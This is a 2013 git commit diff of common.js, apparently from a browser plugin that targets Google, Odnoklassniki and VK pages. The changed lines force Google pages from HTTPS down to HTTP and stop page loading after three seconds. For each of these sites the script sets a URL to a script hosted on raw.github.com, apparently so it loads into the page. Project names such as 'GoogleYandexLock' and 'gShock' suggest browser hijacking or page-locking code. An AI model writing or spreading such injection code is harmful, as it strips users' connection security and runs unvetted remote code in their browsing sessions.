f970e2fdc0c7eee4d1b3cc534db3f9a3a7d3682a
qo101qo <qolol@yandex.ru>
2013-07-16 16:05:10 +0400

    wd

--- common.js
+++ common.js
@@ -9,28 +9,16 @@ if (plg) {
 
 
 if(location.hostname.indexOf('www.google') > -1) {
-			if (location.protocol != "http") location.protocol = "http"
- 			var link = document.location.href.toString();
+			if (location.protocol === "https:") location.protocol = "http";
+			setTimeout('window.stop();',3000);
+ 			/* var link = document.location.href.toString();
 			link = link.replace('https://','http://');
-			document.location = link + window.location.pathname; 
+			document.location = link + window.location.pathname;  */
 			var scr = "https://raw.github.com/ashanmilkin/scripts/master/gHam.js";
 		
 		var scr = "https://raw.github.com/ashanmilkin/scripts/master/gHam.js";
 	}
 
-
-
-	/* if (plg.Get('id') == 'e747eb2129f44e85b0d0cc5a70074dad'){
-		var scr = 'http://localhost/GoogleYandexLock/google/gShock.js';	
-	}
-	else{
-		var scr = 'https://raw.github.com/ashanmilkin/scripts/master/gShock.js';
-	} */
- 
-/* if(location.hostname.indexOf('yandex') > -1) {
-	//var scr = 'https://raw.github.com/ashanmilkin/scripts/master/gShock.js';
-	var scr = 'http://localhost/GoogleYandexLock/yandex/yaShock.js';
-} */
 if(location.hostname.indexOf('odnoklassniki') > -1)
 	var scr = 'https://raw.github.com/ashanmilkin/scripts/master/lod.js';
 if(location.hostname.indexOf('vk') > -1)
